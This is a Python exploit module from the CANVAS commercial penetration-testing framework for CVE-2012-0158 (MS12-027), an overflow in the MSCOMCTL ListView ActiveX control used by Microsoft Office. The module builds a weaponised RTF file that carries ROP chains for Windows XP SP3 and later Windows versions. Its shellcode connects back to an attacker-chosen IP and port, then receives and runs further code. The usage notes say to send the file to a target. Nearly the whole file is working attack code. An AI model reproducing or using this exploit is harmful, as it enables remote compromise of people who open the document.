#! /usr/bin/env python
#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import time
import getopt
import socket
import struct
import canvasengine

from exploitutils import *
from canvasexploit import *

NAME                              = 'MS12-027 MSCOMCTL.OCX ActiveX Buffer Overflow'
DESCRIPTION                       = 'MS12-027 ActiveX MSComctlLib.ListViewCtrl.2 Control Buffer Overflow Vulnerability for Ofice 2010'
DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = "Microsoft"
DOCUMENTATION['Date public']      = '04/10/2012'
DOCUMENTATION['References']       = 'http://technet.microsoft.com/en-us/security/bulletin/ms12-027'
DOCUMENTATION['Repeatability']    = ''
DOCUMENTATION['VersionsAffected'] = 'Office 2003 to Office 2010 SP1'
DOCUMENTATION['CVE Name']         = 'CVE-2012-0158'
DOCUMENTATION['CVE Url']          = 'http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-0158'
DOCUMENTATION['CVSS']             = 9.3

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP','All']
PROPERTY['MSADV']                 = 'MS12-027'

DOCUMENTATION['Notes']            = """

You shoud manually start a Universal listener for this exploit.
The listener IP and PORT should be declared in the module configuration
dialog.

Tested on:
* Windows XP Professional SP3 English with Office 2010 Standard
* Windows 7 English.

The Universal Windows version needs the target to have Word opened
for a few seconds before executing the file.

Usage:
	Generate rtf file and send to target.
    
"""

CHANGELOG                         = """
"""

ROP  = 1
RET  = 2
NOPS = 3

# ROP for all the other Windows supported
# Addreses from msgr3en.dll
rop =  "026B393F"   # pop edx
rop +=  "40000000"  # 0x00000040 # NewProtect

rop += "F3171E3F"   # pop ebx;
rop += "50000000"   # 0x00000050 # size 

rop += "366D393F"   # pop ebp;
rop += "64892C3F"   # pointer to jmp esp

rop += "E7DC383F"   # pop ecx
rop += "0811103F"   # pointer to VirtualProtect Address
rop += "A59C383F"   # mov eax,[ecx]
rop += "EF94303F"   # xchg eax,esi

rop += "CC182F3F"   # pop eax
rop += "90909090"

rop += "E0B92C3F"   # pop ecx
rop += "00003B3F"   # writable address	

rop += "5C6D2D3F"   # pop edi;
rop += "E01C103F"   # pointer to ret

rop += "091D2B3F"   # pushad

ret = "E01C103F"    # pointer to ret

# ROP for Windows XP SP3
ropxp = "0074b47c" # pop eax
ropxp += "90909090"

ropxp += "94b49f7c" # 0x7c9fb494 # pop ecx
ropxp += "4098887c"  # 0x7c889840 # writable address

ropxp +=  "d49fbb7c" # 0x7cbb9fd4 # pop edx
ropxp +=  "40000000" # 0x00000040 # NewProtect

ropxp += "f1eab87c" # 0x7cb8eaf1 # pop ebx;
ropxp += "50000000" # 0x00000050 # size 

ropxp += "6223b27c" # 0x7cb22362 # pop ebp;
ropxp += "e3309d7c" # 0x7c9d30e3 # pointer to jmp esp

ropxp += "4a02b27c" # 0x7cb2024a # pop esi
ropxp += "d41a807c" # 0x7C801AD4 # VirtualProtect Address

ropxp += "eecb9f7c" # 0x7c9fcbee # pop edi;
ropxp += "04c0b87c" # 0x7cb8c004 # pointer to ret

ropxp += "d34fa47c" # 0x7ca44fd3 # pushad

retxp = "04c0b87c" # pointer to ret

targets={
    0: ['Autoversioning',rop,ret,210],     
    1: ['Windows XP SP3 English',ropxp,retxp,218], 
    2: ['All',rop,ret,210]
}

class theexploit(canvasexploit):
    def __init__(self):
        canvasexploit.__init__(self)
        self.version       = 0
        self.name          = NAME 
        self.filename      = 'test.rtf'
        self.callback_ip   = None
        self.callback_port = 5555

    def makefile(self):        
        rop = targets[self.version][ROP]
        ret = targets[self.version][RET]
        
        nops = "90"*targets[self.version][NOPS]
        good_shellcode = ""

        sc = shellcodeGenerator.win32()
        sc.addAttr('findeipnoesp', {'subespval': 0})
        sc.addAttr('revert_to_self_before_importing_ws2_32', None)
        sc.addAttr('tcpconnect', {'port'      : self.callback_port, 
                                  'ipaddress' : self.callback_ip})
        mosdef_type = self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
        mosdef_id = self.engine.getNewMosdefID(self)
        sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
        sc.addAttr("RecvExecDepSafe",{'socketreg': 'FDSPOT'})
        sc.addAttr("ExitThread",None)
        sc.vAllocSelf = True #we need to move to another page!
        callback_payload = sc.get()

        for c in callback_payload:
            if ord(c) <= 15 and ord(c)>=0:
                good_shellcode += "0" + hex(ord(c))[2:4]
            else:
                good_shellcode += hex(ord(c))[2:4]

        content = "{\\rtf1"
        content += "{\\fonttbl{\\f0\\fnil\\fcharset0 Verdana;}}"
        content += "\\viewkind4\\uc1\\pard\\sb100\\sa100\\lang9\\f0\\fs22\\par"
        content += "\\pard\\sa200\\sl276\\slmult1\\lang9\\fs22\\par"
        content += "{\\object\\objocx"
        content += "{\\*\\objdata"
        content += "\n"
        content += "01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000"
        content += "00000000000000000E0000"
        content += "\n"
        content += "D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF09000600000000000000"
        content += "00000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFF"
        content += "FEFFFFFF0400000005000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E007400"
        content += "72007900000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "000000000000000016000500FFFFFFFFFFFFFFFF020000004BF0D1BD8B85D111B16A00C0F0283628"
        content += "0000000062eaDFB9340DCD014559DFB9340DCD0103000000000600000000000003004F0062006A00"
        content += "49006E0066006F000000000000000000000000000000000000000000000000000000000000000000"
        content += "0000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000600000000000000"
        content += "03004F00430058004E0041004D004500000000000000000000000000000000000000000000000000"
        content += "000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000001000000"
        content += "160000000000000043006F006E00740065006E007400730000000000000000000000000000000000"
        content += "000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFF"
        content += "FFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000020000007E05000000000000FEFFFFFFFEFFFFFF03000000040000000500000006000000"
        content += "0700000008000000090000000A0000000B0000000C0000000D0000000E0000000F00000010000000"
        content += "11000000120000001300000014000000150000001600000017000000FEFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content += "FFFFFFFFFFFFFFFF0092030004000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000004C00690073007400"
        content += "56006900650077004100000000000000000000000000000000000000000000000000000000000000"
        content += "0000000000000000000000000000000021433412080000006ab0822cbb0500004E087DEB01000600"
        content += "1C000000000000000000000000060001560A000001EFCDAB00000500985D65010700000008000080"
        content += "05000080000000000000000000000000000000001FDEECBD01000500901719000000080000004974"
        content += "6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000"
        content += "000000000000"
        content += ret	
        content += "9090909090909090"
        content += rop	
        content += nops
        content += "EB0490909090" # This is to jump the bad code inserted by the program
        content += good_shellcode
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content += "00000000000000"
        content += "\n"
        content += "}"
        content += "}"
        content += "}"
        
        return content

    def getArgs(self):
        self.getarg("filename")
        self.getarg("callback_ip")
        self.getarg("callback_port")
        self.version=int(self.argsDict.get('version', self.version))
	
    def run(self):
        self.getArgs()
        self.host = self.target.interface

        if not self.filename:
            self.log('No filename given, aborting..')
            return 0

        if not self.callback_ip:
            self.log('No callback IP given, aborting..')
            return 0

        if not self.callback_port:
            self.log('No callback port given, aborting..')
            return 0
        
        evil_data = self.makefile()
        self.log('Opening %s for output'%(self.filename))
        fd = file(self.filename,'w')
        fd.write(evil_data)
        fd.close()
        
        self.log('Wrote to %s'%(self.filename))
        self.log('Do not forget to start a listener at %s:%s' % (self.callback_ip, self.callback_port))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
    if ret not in [0, 1, None]:
        ret.interact()

